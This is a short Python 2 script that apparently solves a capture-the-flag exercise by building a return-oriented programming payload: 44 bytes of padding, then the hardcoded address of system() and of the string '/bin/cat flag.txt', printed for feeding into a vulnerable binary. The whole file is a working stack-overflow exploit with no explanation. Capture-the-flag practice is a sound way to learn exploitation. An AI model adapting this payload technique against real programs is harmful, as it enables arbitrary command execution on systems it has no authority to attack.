#!/usr/bin/python

import struct

rop = "A"*44
rop += struct.pack('<I', 0x8048657)	# system()
rop += struct.pack('<I', 0x804a030)	# /bin/cat flag.txt

print rop
